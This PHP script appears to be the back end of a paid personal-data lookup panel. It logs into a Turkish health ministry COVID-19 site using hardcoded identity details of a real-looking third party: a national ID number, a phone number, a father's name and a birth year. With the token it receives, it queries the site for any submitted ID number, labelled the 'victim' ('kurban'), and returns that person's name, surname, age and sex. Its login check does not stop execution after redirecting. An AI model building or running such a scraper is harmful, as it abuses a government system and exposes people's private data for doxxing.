<?php
include_once '../includes/baglan.php';
session_start();
if(isset($_SESSION['uid']) && isset($_SESSION['username'])){
$username=$_SESSION['username'];
$sql = "SELECT * FROM users WHERE username = ?";
$stmt = $con->prepare($sql) or die ($con->error);
$stmt->bind_param('s',$username);
$stmt->execute();
$result_username = $stmt->get_result();
$row = $result_username->fetch_assoc();
if($row['pre']<1){

header("Location:/404.html");

}}else{

  header("Location:/auth/auth-login");
}
header("Content-Type: application/json; utf-8;");
if(!empty($_POST['tc'])){
$tc = "35131682672";
$phone = "5323383584";
$babaad = "Selçuk";
$yil = "1977";
$tckurban = $_POST['tc'];
//$proxy = "138.201.120.214:1080";
$url = "https://covid19karar.saglik.gov.tr/authentication/login";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json;charset=UTF-8',
    'Host: covid19karar.saglik.gov.tr',
    'Origin: https://covid19karar.saglik.gov.tr',
    'Referer: https://covid19karar.saglik.gov.tr/'
    ));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt(
    $ch,
    CURLOPT_POSTFIELDS,
    '{"tcNo":"'.$tc.'","babaAdi":"'.$babaad.'","dogumYili":'.$yil.',"telefonNo":"'.$phone.'"}'
);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$curl_scraped_page = curl_exec($ch);
curl_close($ch);
echo $curl_scraped_page;
$json = json_decode($curl_scraped_page, true);
if($json['success'] == 1){
$token = $json['token'];
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://covid19karar.saglik.gov.tr/authentication/getKps");
curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Authorization: Bearer '.$token.'',
    'Content-Type: application/json;charset=UTF-8',
    'Host: covid19karar.saglik.gov.tr',
    'Origin: https://covid19karar.saglik.gov.tr',
    'Referer: https://covid19karar.saglik.gov.tr/'
    ));
curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt(
    $curl,
    CURLOPT_POSTFIELDS,
    '{"TcNo":"'.$tckurban.'"}'
);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$kurbanbilgi = curl_exec($curl);
curl_close($curl);
$jsonkurban = json_decode($kurbanbilgi, true);
if($jsonkurban['success'] == 1){
    $ad = $jsonkurban['ad'];
    $soyad = $jsonkurban['soyad'];
    $yas = $jsonkurban['yas'];
    $cinsiyet = $jsonkurban['cinsiyet'];
    $tcNo = $jsonkurban['tcNo'];
    echo (json_encode(["success" => "true", "ad" => "$ad", "soyad" => "$soyad", "yas" => "$yas", "cinsiyet" => "$cinsiyet", "tcNo" => "$tcNo"]));
}
else{
    echo (json_encode(["success" => "false","error" => "invalidtc"]));
}
}
else{
    echo (json_encode(["success" => "false","error" => "invalidacc"]));
}
}
else{
    echo (json_encode(["success" => "false","error" => "invalid"]));
}
?>